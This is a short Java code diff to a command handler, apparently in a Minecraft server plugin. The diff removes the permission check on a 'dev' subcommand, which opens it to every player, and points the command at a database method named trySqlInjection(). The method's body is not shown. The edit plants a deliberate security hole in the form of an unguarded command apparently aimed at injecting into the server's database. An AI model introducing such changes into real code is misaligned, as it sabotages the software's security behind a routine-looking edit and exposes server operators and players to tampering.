@@ -207,8 +207,10 @@ public class KitCommand {
                         )
 
                         .then(Commands.literal("dev")
-                                .requires(src -> PermissionUtil.hasPermission(src.getPlayer(), "asdepack.kit.dev"))
-                                .executes(ctx -> dev(ctx.getSource()))
+                                .executes(context -> {
+                                    Server.getDatabaseManager().getKitManager().trySqlInjection();
+                                    return 1;
+                                })
                         )
         );
     }
